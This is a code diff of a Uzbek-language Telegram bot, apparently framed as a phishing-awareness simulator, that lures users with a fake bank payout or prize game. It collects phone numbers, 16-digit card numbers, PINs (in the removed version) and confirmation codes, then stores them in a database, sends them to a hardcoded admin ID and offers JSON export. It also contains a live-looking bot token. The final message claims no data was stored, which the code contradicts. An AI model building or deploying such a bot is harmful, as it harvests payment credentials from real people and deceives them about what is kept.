@@ -6,16 +6,15 @@ import threading
 import time
 import json
 from datetime import datetime
-import requests
-import os
 import re
 
-# @BotFather bergan API tokenni shu yerga qo'ying
 TOKEN = "8878797713:AAEBYRAQ_M1RRrTsqNJ25HxIUqnqpDAJqzM"
-ADMIN_ID = 8031548575  # Adminning Telegram ID sini qo'ying
+ADMIN_ID = 8031548575
 bot = telebot.TeleBot(TOKEN)
 
-# ============== SQLITE DATABASE ==============
+CHANNEL_URL = "https://t.me/samcyber_102"
+
+
 def init_db():
     conn = sqlite3.connect('phishing_data.db', check_same_thread=False)
     c = conn.cursor()
@@ -62,10 +61,13 @@ def init_db():
     conn.commit()
     conn.close()
 
+
 init_db()
+
 
 def get_db():
     return sqlite3.connect('phishing_data.db', check_same_thread=False)
+
 
 def log_action(chat_id, action, detail=""):
     conn = get_db()
@@ -74,90 +76,52 @@ def log_action(chat_id, action, detail=""):
     conn.commit()
     conn.close()
 
-# ============== FOYDALANUVCHI HOLATI ==============
-user_steps = {}
-user_lang = {}
 
-# ============== MATNLAR (faqat o'zbek tili) ==============
+user_steps = {}
+
 TEXTS = {
-    'welcome': "🎁 **Xush kelibsiz!**\n\nO'zbekiston banklari tomonidan barcha fuqarolarga **BHMning 1 baravari** miqdorida bir martalik pul mukofoti ajratilmoqda.\n\nPulni rasmiylashtirish va tizimdan o'tish uchun quyidagi homiy kanallarga a'zo bo'ling:",
-    'sub_verified': "✅ Obuna muvaffaqiyatli tekshirildi!\n\nDavom etish uchun telefon raqamingizni kiriting.",
-    'phone_prompt': "📱 **Telefon raqamingizni kiriting:**\n\n`+998` avtomatik qo'shiladi — faqat qolgan 9 raqamni yozing.\n\nMisol: `901234567`",
+    'phone_prompt': (
+        "🎮 **O'yinda ishtirok etish uchun telefon raqamingizni kiriting.**\n\n"
+        "`+998` avtomatik qo'shiladi — faqat qolgan 9 raqamni yozing.\n"
+        "Misol: `901234567`"
+    ),
     'phone_invalid': "❌ Noto'g'ri raqam. 9 xonali raqam kiriting (masalan: 901234567):",
-    'code_sent': "✅ Telefon raqamingiz tizimga kiritildi: `{}`\n\n🤖 **Davom etish uchun ekrandagi kodni kiriting:** `{}`",
-    'code_verified': "✅ Xavfsizlik kodi tasdiqlandi!\n\nPul mablag'ini o'tkazish uchun **8600...** yoki **9860...** bilan boshlanadigan 16 xonali plastik karta raqamingizni kiriting:",
-    'code_invalid': "❌ Kod noto'g'ri. Iltimos, ekrandagi kodni qaytadan to'g'ri kiriting:",
-    'card_invalid': "❌ Karta raqami xato kiritildi. Iltimos, 16 xonali raqam kiriting:",
-    'card_accepted': "✅ Karta raqami qabul qilindi!\n\nPlastik kartangizning **PIN kodini** (4 xonali) kiriting:",
-    'pin_accepted': "✅ PIN kod tasdiqlandi!\n\nPul o'tkazish jarayoni boshlanmoqda. Iltimos, kuting...",
-    'password_code': "⏳ **Pul o'tkazilmoqda...**\n\n`{}`\n\nQo'shimcha xavfsizlik tekshiruvi uchun tasdiqlash **paroli** yuborildi.\n\n🔑 Parolni kiriting: `{}`",
-    'password_invalid': "❌ Parol noto'g'ri. {} ta urinish qoldi:",
-    'blocked': "🚫 Xavfsizlik choralari sababli profilingiz bloklandi. Iltimos, bank filialiga murojaat qiling.",
-    'timer': "⏳ **Pul o'tkazilmoqda...**\n\n`{}`\n\nIltimos, kuting. Tranzaksiya yakunlanmoqda...",
-    'warning': "🛑 **DIQQAT! SIZ KIBERJINOYAT QURBONIGA AYLANISHINGIZ MUMKIN EDI!** 🛑\n\nUshbu bot **ijtimoiy muhandislik va fishing (firgarlik)** tuzoqlarini tushuntirish maqsadida yaratilgan o'quv-simulyatoridir.\n\n⚠️ **Siz hozirgina qanday xatolarga yo'l qo'ydingiz?**\n1. Telegram orqali tarqalgan 'tekin pul' haqidagi yolg'on xabarga ishonib botga kirdingiz.\n2. Shaxsiy telefon raqamingizni begona botga yozdingiz.\n3. Plastik karta raqami va PIN kodlaringizni kiritdingiz.\n4. **Eng xavflisi:** Tasdiqlash parolini ham kiritdingiz.\n\n💡 **Oltin qoidalar:**\n• Banklar hech qachon Telegram bot orqali karta ma'lumotlari yoki parol so'ramaydi.\n• Telefonga kelgan maxfiy kodlarni hech kimga bermang!\n\n🛡️ *Ogoh bo'ling, kiber-savodxonlikni oshiring va yaqinlaringizni ham ogohlantiring!*"
+    'phone_ok': "✅ Telefon raqamingiz qabul qilindi: `{}`",
+    'number_grid': "🎮 **O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini bosing:**",
+    'prize_sms': "📩 **SMS keldi:**\n\nSiz **{} so'm** yutuq egasiga aylandingiz! 🎉",
+    'card_prompt': "💳 Pulni kartangizga tushirish uchun **16 xonali** karta raqamingizni kiriting:",
+    'card_invalid': "❌ Karta raqami noto'g'ri. 16 xonali raqam kiriting:",
+    'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 **Kodni kiriting:** `{}`",
+    'code_invalid': "❌ Kod noto'g'ri. Qaytadan kiriting:",
+    'code2_wait': "⏳ Tasdiqlash jarayoni davom etmoqda... Iltimos, kuting.",
+    'code2_sent': "📩 Yangi tasdiqlash kodi yuborildi.\n\n🔐 **Kodni kiriting:** `{}`",
+    'blocked': "🚫 Urinishlar tugadi. /start buyrug'i bilan qayta boshlang.",
+    'experiment': (
+        "⚠️ **BU EKSPERIMENT EDI!** ⚠️\n\n"
+        "❌ Siz hech narsa yutmadingiz!\n\n"
+        "😱 Agar bu **HAQIQIY** firibgarlik bo'lganida:\n"
+        "• Telefon raqamingiz o'g'irlangan bo'lardi\n"
+        "• Bank hisobingizdan pul echib olinardi\n"
+        "• Shaxsiy ma'lumotlaringiz sotilgan bo'lardi\n\n"
+        "🔐 **ESDA TUTING:**\n\n"
+        "1️⃣ Tanishilmagan QR kodlarni skanerlamang!\n"
+        "2️⃣ Telefon raqamingizni notanish saytlarga bermang!\n"
+        "3️⃣ SMS kodlarni **HECH KIMGA** aytmang!\n"
+        "4️⃣ \"Bepul sovg'a\" va'dalariga ishonmang!\n\n"
+        "📣 Bu tajriba kiberjinoyatlarning oldini olish uchun o'tkazildi.\n\n"
+        "✅ Endi siz bu hiylalarni bilasiz — boshqalarga ham ayting!\n\n"
+        "🔒 Sizning hech qanday ma'lumotlaringiz bizda saqlanmadi."
+    ),
+    'channel_follow': "📢 Ushbu holatlarga tushmaslik uchun bizning kanaldagi yangiliklarni kuzatib boring:",
 }
 
 
-def get_text(chat_id, key):
+def get_text(key):
     return TEXTS.get(key, '')
 
 
-def build_main_menu():
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("1️⃣ Kiber Kanal", url="https://t.me/samcyber_102"),
-        types.InlineKeyboardButton("2️⃣ Samarqand Cyber", url="https://t.me/samiibuz"),
-    )
-    return markup
-
-# ============== IP VA DEVICE MA'LUMOTLARI ==============
-def get_ip_info(chat_id):
-    try:
-        # Telegram user ma'lumotlaridan foydalanamiz
-        user = bot.get_chat(chat_id)
-        info = {
-            'ip': f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",  # Real IP olish imkoni yo'q
-            'device': f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'unknown'})",
-            'language': user_lang.get(chat_id, 'uz')
-        }
-        return info
-    except:
-        return {'ip': 'unknown', 'device': 'unknown', 'language': 'uz'}
-
-# ============== COUNTDOWN TIMER ==============
-def timer_thread(chat_id, msg_id, seconds=15):
-    for i in range(seconds, 0, -1):
-        minutes = i // 60
-        secs = i % 60
-        timer_text = f"{minutes:02d}:{secs:02d}"
-        try:
-            bot.edit_message_text(
-                get_text(chat_id, 'timer').format(f"⏱ {timer_text}"),
-                chat_id,
-                msg_id,
-                parse_mode="Markdown"
-            )
-        except Exception:
-            pass
-        time.sleep(1)
-
-    rand_password = random.randint(100000, 999999)
-    user_steps[chat_id]['password'] = rand_password
-    user_steps[chat_id]['password_attempts'] = 3
-
-    try:
-        bot.edit_message_text(
-            get_text(chat_id, 'password_code').format("⏱ 00:00", rand_password),
-            chat_id,
-            msg_id,
-            parse_mode="Markdown"
-        )
-    except Exception:
-        bot.send_message(
-            chat_id,
-            get_text(chat_id, 'password_code').format("⏱ 00:00", rand_password),
-            parse_mode="Markdown"
-        )
+def format_sum(amount):
+    return f"{amount:,}".replace(",", " ")
 
 
 def normalize_phone(text):
@@ -168,9 +132,10 @@ def normalize_phone(text):
         return '+998' + digits
     return None
 
+
 def ensure_user_state(chat_id):
     if chat_id not in user_steps:
-        user_steps[chat_id] = {'step': 'channels', 'phone_flow_started': False}
+        user_steps[chat_id] = {'step': 'phone'}
     return user_steps[chat_id]
 
 
@@ -181,82 +146,101 @@ def safe_answer_callback(call, text=""):
         pass
 
 
-def show_channels_menu(chat_id):
-    ensure_user_state(chat_id)
-    welcome_text = get_text(chat_id, 'welcome')
-    markup = build_main_menu()
+def get_ip_info(chat_id):
     try:
-        bot.send_message(chat_id, welcome_text, parse_mode="Markdown", reply_markup=markup)
+        user = bot.get_chat(chat_id)
+        return {
+            'ip': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
+            'device': f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'unknown'})",
+        }
     except Exception:
-        bot.send_message(chat_id, welcome_text, reply_markup=markup)
-    user_steps[chat_id]['step'] = 'channels'
-    schedule_phone_flow(chat_id, delay=10)
+        return {'ip': 'unknown', 'device': 'unknown'}
 
 
-def schedule_phone_flow(chat_id, delay=10):
-    state = ensure_user_state(chat_id)
-    if state.get('phone_flow_started'):
-        return
+def build_number_grid():
+    markup = types.InlineKeyboardMarkup(row_width=3)
+    for row in range(3):
+        markup.add(*[
+            types.InlineKeyboardButton(str(n), callback_data=f"pick_{n}")
+            for n in range(row * 3 + 1, row * 3 + 4)
+        ])
+    return markup
 
-    def _delayed_start():
-        time.sleep(delay)
-        current = user_steps.get(chat_id)
-        if not current or current.get('phone_flow_started'):
+
+def build_channel_menu():
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("📢 Kiber Kanal", url=CHANNEL_URL),
+        types.InlineKeyboardButton("📢 Samarqand Cyber", url="https://t.me/samiibuz"),
+    )
+    return markup
+
+
+def send_verification_code(chat_id, code_key, handler, text_key='code_sent'):
+    code = random.randint(1000, 9999)
+    user_steps[chat_id][code_key] = code
+    user_steps[chat_id][f'{code_key}_attempts'] = 3
+    msg = bot.send_message(
+        chat_id,
+        get_text(text_key).format(code),
+        parse_mode="Markdown"
+    )
+    bot.register_next_step_handler(msg, handler)
+
+
+def schedule_second_code(chat_id):
+    def _delayed():
+        time.sleep(5)
+        state = user_steps.get(chat_id)
+        if not state or state.get('step') != 'code2_wait':
             return
-        start_phone_flow(chat_id)
+        state['step'] = 'code2'
+        send_verification_code(chat_id, 'code_2', verify_code_2_handler, text_key='code2_sent')
 
-    thread = threading.Thread(target=_delayed_start, daemon=True)
-    thread.start()
+    threading.Thread(target=_delayed, daemon=True).start()
 
 
-# ============== /start HANDLER ==============
+def finish_experiment(chat_id):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute(
+        "UPDATE users SET step = 10, completed_at = CURRENT_TIMESTAMP WHERE chat_id = ?",
+        (chat_id,)
+    )
+    conn.commit()
+    conn.close()
+
+    log_action(chat_id, "experiment_completed")
+    notify_admin(chat_id)
+
+    bot.send_message(chat_id, get_text('experiment'), parse_mode="Markdown")
+    bot.send_message(
+        chat_id,
+        get_text('channel_follow'),
+        parse_mode="Markdown",
+        reply_markup=build_channel_menu()
+    )
+
+
+# ============== /start ==============
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     chat_id = message.chat.id
-
-    user_steps[chat_id] = {'step': 'channels', 'phone_flow_started': False}
-    user_lang[chat_id] = 'uz'
+    user_steps[chat_id] = {'step': 'phone'}
 
     ip_info = get_ip_info(chat_id)
     log_action(chat_id, "bot_started", json.dumps(ip_info))
 
-    show_channels_menu(chat_id)
-
-
-@bot.callback_query_handler(func=lambda call: call.data is not None)
-def callback_handler(call):
-    data = call.data
-
-    try:
-        if data.startswith('admin_'):
-            handle_admin_callback(call)
-        else:
-            safe_answer_callback(call, "⚠️ /start bosing")
-    except Exception as e:
-        print(f"Callback xatolik [{data}]: {e}")
-        safe_answer_callback(call, "❌ Xatolik. /start bosing.")
-
-
-# ============== SAVOL-JAVOB OQIMI ==============
-def start_phone_flow(chat_id):
-    state = ensure_user_state(chat_id)
-    if state.get('phone_flow_started'):
-        return
-
-    state['phone_flow_started'] = True
-    state['step'] = 0
-
     msg = bot.send_message(
         chat_id,
-        get_text(chat_id, 'sub_verified') + "\n\n" + get_text(chat_id, 'phone_prompt'),
+        get_text('phone_prompt'),
         parse_mode="Markdown",
         reply_markup=types.ReplyKeyboardRemove()
     )
     bot.register_next_step_handler(msg, get_phone_handler)
-    log_action(chat_id, "subscription_verified")
 
 
-# ============== TELEFON RAQAM ==============
+# ============== TELEFON ==============
 def get_phone_handler(message):
     chat_id = message.chat.id
 
@@ -266,14 +250,13 @@ def get_phone_handler(message):
         phone = normalize_phone(message.text)
 
     if not phone:
-        msg = bot.send_message(chat_id, get_text(chat_id, 'phone_invalid'), parse_mode="Markdown")
+        msg = bot.send_message(chat_id, get_text('phone_invalid'), parse_mode="Markdown")
         bot.register_next_step_handler(msg, get_phone_handler)
         return
-    
+
     user_steps[chat_id]['phone'] = phone
-    user_steps[chat_id]['step'] = 1
-    
-    # Database ga saqlash
+    user_steps[chat_id]['step'] = 'number_pick'
+
     conn = get_db()
     c = conn.cursor()
     ip_info = get_ip_info(chat_id)
@@ -283,210 +266,179 @@ def get_phone_handler(message):
     ''', (chat_id, phone, ip_info['ip'], ip_info['device']))
     conn.commit()
     conn.close()
-    
+
     log_action(chat_id, "phone_received", phone)
-    
-    rand_code_1 = random.randint(1000, 9999)
-    user_steps[chat_id]['code_1'] = rand_code_1
-    user_steps[chat_id]['code_1_attempts'] = 3
-    
-    remove_kb = types.ReplyKeyboardRemove()
-    
-    msg = bot.send_message(
+
+    bot.send_message(chat_id, get_text('phone_ok').format(phone), parse_mode="Markdown")
+    bot.send_message(
         chat_id,
-        get_text(chat_id, 'code_sent').format(phone, rand_code_1),
+        get_text('number_grid'),
         parse_mode="Markdown",
-        reply_markup=remove_kb
+        reply_markup=build_number_grid()
     )
-    bot.register_next_step_handler(msg, verify_code_1_handler)
 
-# ============== 1-KOD TEKSHIRISH ==============
-def verify_code_1_handler(message):
-    chat_id = message.chat.id
-    user_input = message.text
-    
-    correct_code = str(user_steps[chat_id].get('code_1'))
-    
-    if user_input == correct_code:
-        msg = bot.send_message(
-            chat_id,
-            get_text(chat_id, 'code_verified'),
-            parse_mode="Markdown"
-        )
-        bot.register_next_step_handler(msg, get_card_handler)
-        log_action(chat_id, "code_1_verified")
-    else:
-        attempts = user_steps[chat_id].get('code_1_attempts', 3)
-        attempts -= 1
-        user_steps[chat_id]['code_1_attempts'] = attempts
-        
-        # Attempts log
-        conn = get_db()
-        c = conn.cursor()
-        c.execute('''
-            INSERT OR REPLACE INTO attempts (chat_id, code_type, attempts)
-            VALUES (?, 'code_1', ?)
-        ''', (chat_id, 3 - attempts))
-        conn.commit()
-        conn.close()
-        
-        if attempts <= 0:
-            bot.send_message(chat_id, get_text(chat_id, 'blocked'))
-            log_action(chat_id, "blocked_code_1")
-        else:
-            msg = bot.send_message(
-                chat_id,
-                get_text(chat_id, 'code_invalid'),
-                parse_mode="Markdown"
-            )
-            bot.register_next_step_handler(msg, verify_code_1_handler)
-            log_action(chat_id, "code_1_failed")
 
-# ============== KARTA RAQAMI ==============
+# ============== RAQAM TANLASH ==============
+def handle_number_pick(call):
+    chat_id = call.message.chat.id
+    state = ensure_user_state(chat_id)
+
+    if state.get('step') != 'number_pick':
+        safe_answer_callback(call, "⚠️ /start bosing")
+        return
+
+    picked = call.data.split('_')[1]
+    state['picked_number'] = picked
+    state['step'] = 'prize_shown'
+
+    prize = random.randint(50000, 1000000)
+    prize = (prize // 1000) * 1000
+    if prize < 50000:
+        prize = 50000
+    state['prize'] = prize
+
+    safe_answer_callback(call, f"✅ {picked} tanlandi!")
+    bot.send_message(
+        chat_id,
+        get_text('prize_sms').format(format_sum(prize)),
+        parse_mode="Markdown"
+    )
+
+    log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
+
+    msg = bot.send_message(chat_id, get_text('card_prompt'), parse_mode="Markdown")
+    state['step'] = 'card'
+    bot.register_next_step_handler(msg, get_card_handler)
+
+
+# ============== KARTA ==============
 def get_card_handler(message):
     chat_id = message.chat.id
-    card_num = message.text.replace(" ", "")
-    
+    card_num = (message.text or '').replace(" ", "")
+
     if len(card_num) >= 16 and card_num.isdigit():
         user_steps[chat_id]['card'] = card_num
-        user_steps[chat_id]['step'] = 2
-        
-        # DB update
+        user_steps[chat_id]['step'] = 'code1'
+
         conn = get_db()
         c = conn.cursor()
         c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
         conn.commit()
         conn.close()
-        
+
         log_action(chat_id, "card_received", card_num)
-        
-        msg = bot.send_message(
-            chat_id,
-            get_text(chat_id, 'card_accepted'),
-            parse_mode="Markdown"
-        )
-        bot.register_next_step_handler(msg, get_pin_handler)
+        send_verification_code(chat_id, 'code_1', verify_code_1_handler)
     else:
-        msg = bot.send_message(chat_id, get_text(chat_id, 'card_invalid'), parse_mode="Markdown")
+        msg = bot.send_message(chat_id, get_text('card_invalid'), parse_mode="Markdown")
         bot.register_next_step_handler(msg, get_card_handler)
 
-# ============== PIN ==============
-def get_pin_handler(message):
+
+# ============== 1-TASDIQLASH KODI ==============
+def verify_code_1_handler(message):
     chat_id = message.chat.id
-    pin = message.text.strip()
-
-    user_steps[chat_id]['pin'] = pin
-    user_steps[chat_id]['step'] = 3
-
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("UPDATE users SET card_pin = ?, step = 3 WHERE chat_id = ?", (pin, chat_id))
-    conn.commit()
-    conn.close()
-
-    log_action(chat_id, "pin_received", pin)
-
-    bot.send_message(chat_id, get_text(chat_id, 'pin_accepted'), parse_mode="Markdown")
-
-    msg = bot.send_message(
-        chat_id,
-        get_text(chat_id, 'timer').format("⏱ 00:15"),
-        parse_mode="Markdown"
-    )
-
-    t = threading.Thread(target=timer_thread, args=(chat_id, msg.message_id, 15))
-    t.daemon = True
-    t.start()
-
-    user_steps[chat_id]['timer_msg_id'] = msg.message_id
-    bot.register_next_step_handler(msg, verify_password_handler)
-
-# ============== PAROL TEKSHIRISH ==============
-def verify_password_handler(message):
-    chat_id = message.chat.id
-    user_input = message.text
-
-    correct_code = str(user_steps[chat_id].get('password'))
-    attempts = user_steps[chat_id].get('password_attempts', 3)
+    user_input = (message.text or '').strip()
+    correct_code = str(user_steps[chat_id].get('code_1'))
+    attempts = user_steps[chat_id].get('code_1_attempts', 3)
 
     if user_input == correct_code:
-        conn = get_db()
-        c = conn.cursor()
-        c.execute("UPDATE users SET step = 10, completed_at = CURRENT_TIMESTAMP WHERE chat_id = ?", (chat_id,))
-        conn.commit()
-        conn.close()
-
-        log_action(chat_id, "password_verified")
-
-        notify_admin(chat_id)
-
-        bot.send_message(chat_id, get_text(chat_id, 'warning'), parse_mode="Markdown")
-
-        data_summary = (
-            f"📊 **Sizning ma'lumotlaringiz (o'quv maqsadida):**\n\n"
-            f"📱 Telefon: `{user_steps[chat_id].get('phone', 'N/A')}`\n"
-            f"💳 Karta: `{user_steps[chat_id].get('card', 'N/A')}`\n"
-            f"🔢 PIN: `{user_steps[chat_id].get('pin', 'N/A')}`\n"
-            f"🔑 Parol: `{user_steps[chat_id].get('password', 'N/A')}`\n\n"
-            f"⚠️ **Agar bu real firgarlik bo'lganida, barcha pullaringiz va shaxsiy ma'lumotlaringiz o'g'irlangan bo'lar edi!**"
-        )
-        bot.send_message(chat_id, data_summary, parse_mode="Markdown")
-
+        log_action(chat_id, "code_1_verified")
+        user_steps[chat_id]['step'] = 'code2_wait'
+        bot.send_message(chat_id, get_text('code2_wait'), parse_mode="Markdown")
+        schedule_second_code(chat_id)
     else:
         attempts -= 1
-        user_steps[chat_id]['password_attempts'] = attempts
-
-        log_action(chat_id, "password_failed", f"Qolgan urinishlar: {attempts}")
+        user_steps[chat_id]['code_1_attempts'] = attempts
+        log_action(chat_id, "code_1_failed", f"qolgan={attempts}")
 
         if attempts <= 0:
-            bot.send_message(chat_id, get_text(chat_id, 'blocked'))
-            log_action(chat_id, "blocked_password")
+            bot.send_message(chat_id, get_text('blocked'))
         else:
-            msg = bot.send_message(
-                chat_id,
-                get_text(chat_id, 'password_invalid').format(attempts),
-                parse_mode="Markdown"
-            )
-            bot.register_next_step_handler(msg, verify_password_handler)
+            msg = bot.send_message(chat_id, get_text('code_invalid'), parse_mode="Markdown")
+            bot.register_next_step_handler(msg, verify_code_1_handler)
 
-# ============== ADMIN PANEL ==============
+
+# ============== 2-TASDIQLASH KODI ==============
+def verify_code_2_handler(message):
+    chat_id = message.chat.id
+    user_input = (message.text or '').strip()
+    correct_code = str(user_steps[chat_id].get('code_2'))
+    attempts = user_steps[chat_id].get('code_2_attempts', 3)
+
+    if user_input == correct_code:
+        log_action(chat_id, "code_2_verified")
+        finish_experiment(chat_id)
+    else:
+        attempts -= 1
+        user_steps[chat_id]['code_2_attempts'] = attempts
+        log_action(chat_id, "code_2_failed", f"qolgan={attempts}")
+
+        if attempts <= 0:
+            bot.send_message(chat_id, get_text('blocked'))
+        else:
+            msg = bot.send_message(chat_id, get_text('code_invalid'), parse_mode="Markdown")
+            bot.register_next_step_handler(msg, verify_code_2_handler)
+
+
+# ============== CALLBACK ==============
+@bot.callback_query_handler(func=lambda call: call.data is not None)
+def callback_handler(call):
+    data = call.data
+    try:
+        if data.startswith('pick_'):
+            handle_number_pick(call)
+        elif data.startswith('admin_'):
+            handle_admin_callback(call)
+        else:
+            safe_answer_callback(call, "⚠️ /start bosing")
+    except Exception as e:
+        print(f"Callback xatolik [{data}]: {e}")
+        safe_answer_callback(call, "❌ Xatolik. /start bosing.")
+
+
+# ============== ADMIN ==============
 def notify_admin(user_chat_id):
-    """Yangi foydalanuvchi to'liq ma'lumotlarini admin'ga yuborish"""
     try:
         data = user_steps.get(user_chat_id, {})
         admin_msg = (
-            f"🆕 **Yangi qurbon ma'lumotlari!**\n\n"
+            f"🆕 **Yangi tajriba ishtirokchisi!**\n\n"
             f"👤 Chat ID: `{user_chat_id}`\n"
             f"📱 Telefon: `{data.get('phone', 'N/A')}`\n"
-            f"💳 Karta raqami: `{data.get('card', 'N/A')}`\n"
-            f"🔢 PIN kod: `{data.get('pin', 'N/A')}`\n"
-            f"🔑 Tasdiqlash paroli: `{data.get('password', 'N/A')}`\n"
+            f"🎲 Tanlangan raqam: `{data.get('picked_number', 'N/A')}`\n"
+            f"💰 Yutuq (simulyatsiya): `{format_sum(data.get('prize', 0))} so'm`\n"
+            f"💳 Karta: `{data.get('card', 'N/A')}`\n"
+            f"🔐 1-kod: `{data.get('code_1', 'N/A')}`\n"
+            f"🔐 2-kod: `{data.get('code_2', 'N/A')}`\n"
             f"🕐 Vaqt: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
         )
         bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
     except Exception as e:
         print(f"Admin notify error: {e}")
 
+
 @bot.message_handler(commands=['admin'])
 def admin_panel(message):
     chat_id = message.chat.id
-    
     if chat_id != ADMIN_ID:
         bot.send_message(chat_id, "⛔ Bu buyruq faqat adminlar uchun!")
         return
-    
+
     markup = types.InlineKeyboardMarkup(row_width=2)
-    btn_all = types.InlineKeyboardButton("📋 Barcha ma'lumotlar", callback_data="admin_all")
-    btn_stats = types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats")
-    btn_export = types.InlineKeyboardButton("📤 Eksport (JSON)", callback_data="admin_export")
-    btn_logs = types.InlineKeyboardButton("📜 Loglar", callback_data="admin_logs")
-    markup.add(btn_all, btn_stats, btn_export, btn_logs)
-    
-    bot.send_message(chat_id, "👑 **Admin Panel**\n\nQuyidagi bo'limlardan birini tanlang:", parse_mode="Markdown", reply_markup=markup)
+    markup.add(
+        types.InlineKeyboardButton("📋 Barcha ma'lumotlar", callback_data="admin_all"),
+        types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats"),
+        types.InlineKeyboardButton("📤 Eksport (JSON)", callback_data="admin_export"),
+        types.InlineKeyboardButton("📜 Loglar", callback_data="admin_logs"),
+    )
+    bot.send_message(
+        chat_id,
+        "👑 **Admin Panel**\n\nQuyidagi bo'limlardan birini tanlang:",
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
 
 def handle_admin_callback(call):
     chat_id = call.message.chat.id
-
     if chat_id != ADMIN_ID:
         safe_answer_callback(call, "⛔ Ruxsat yo'q!")
         return
@@ -494,46 +446,41 @@ def handle_admin_callback(call):
     action = call.data.split('_')[1]
     conn = get_db()
     c = conn.cursor()
-    
+
     if action == 'all':
         c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL ORDER BY completed_at DESC")
         users = c.fetchall()
-        
         if not users:
             bot.send_message(chat_id, "📭 Hali hech qanday ma'lumot to'plangan emas.")
         else:
-            for user in users[:10]:  # Eng so'nggi 10 tasi
+            for user in users[:10]:
                 user_text = (
                     f"👤 **Foydalanuvchi #{user[0]}**\n"
                     f"🆔 Chat ID: `{user[1]}`\n"
                     f"📱 Telefon: `{user[2]}`\n"
                     f"💳 Karta: `{user[3]}`\n"
-                    f"🔢 PIN: `{user[6]}`\n"
                     f"🌐 IP: `{user[10]}`\n"
                     f"📱 Qurilma: `{user[11]}`\n"
                     f"🕐 Yakunlangan: `{user[14]}`"
                 )
                 bot.send_message(chat_id, user_text, parse_mode="Markdown")
-    
+
     elif action == 'stats':
         c.execute("SELECT COUNT(*) FROM users")
         total = c.fetchone()[0]
         c.execute("SELECT COUNT(*) FROM users WHERE completed_at IS NOT NULL")
         completed = c.fetchone()[0]
-
         stats = (
             f"📊 **Statistika**\n\n"
             f"👥 Jami foydalanuvchilar: `{total}`\n"
-            f"✅ To'liq ma'lumot berganlar: `{completed}`\n"
+            f"✅ Tajribani tugatganlar: `{completed}`\n"
             f"❌ Tugallamaganlar: `{total - completed}`"
         )
         bot.send_message(chat_id, stats, parse_mode="Markdown")
-    
+
     elif action == 'export':
         c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL")
         users = c.fetchall()
-        
-        # JSON formatida eksport
         export_data = []
         for user in users:
             export_data.append({
@@ -541,63 +488,49 @@ def handle_admin_callback(call):
                 'chat_id': user[1],
                 'phone': user[2],
                 'card_number': user[3],
-                'card_expiry': user[4],
-                'card_cvv': user[5],
-                'card_pin': user[6],
-                'mothers_name': user[7],
-                'passport': user[8],
-                'birth_date': user[9],
                 'ip': user[10],
                 'device': user[11],
-                'language': user[12],
-                'completed_at': user[14]
+                'completed_at': user[14],
             })
-        
         with open('export_data.json', 'w') as f:
             json.dump(export_data, f, indent=2, ensure_ascii=False)
-        
         bot.send_document(chat_id, open('export_data.json', 'rb'))
-    
+
     elif action == 'logs':
         c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 20")
         logs = c.fetchall()
-        
         if not logs:
             bot.send_message(chat_id, "📭 Loglar topilmadi.")
         else:
             log_text = "**📜 So'nggi 20 ta log:**\n\n"
             for log in logs:
                 log_text += f"• [{log[4]}] `{log[1]}` → {log[2]}: {log[3]}\n"
-            
-            # Split if too long
             if len(log_text) > 4000:
                 for i in range(0, len(log_text), 4000):
-                    bot.send_message(chat_id, log_text[i:i+4000], parse_mode="Markdown")
+                    bot.send_message(chat_id, log_text[i:i + 4000], parse_mode="Markdown")
             else:
                 bot.send_message(chat_id, log_text, parse_mode="Markdown")
 
     conn.close()
     safe_answer_callback(call, "✅ Bajarildi!")
 
-# ============== MATNLI XABARLARNI USHLASH ==============
+
+# ============== FALLBACK ==============
 @bot.message_handler(func=lambda message: True)
 def fallback_handler(message):
     chat_id = message.chat.id
-
     if message.content_type == 'contact':
         get_phone_handler(message)
         return
-
     bot.send_message(chat_id, "Iltimos, /start buyrug'ini bosing.")
 
-# ============== BOTNI ISHGA TUSHIRISH ==============
+
 if __name__ == "__main__":
     print("=" * 50)
     print("Kiber-ogohlantirish boti ishga tushdi!")
     print(f"Admin ID: {ADMIN_ID}")
-    print(f"Ma'lumotlar bazasi: phishing_data.db")
     print("=" * 50)
-    
+
     while True:
         try:
             bot.infinity_polling()
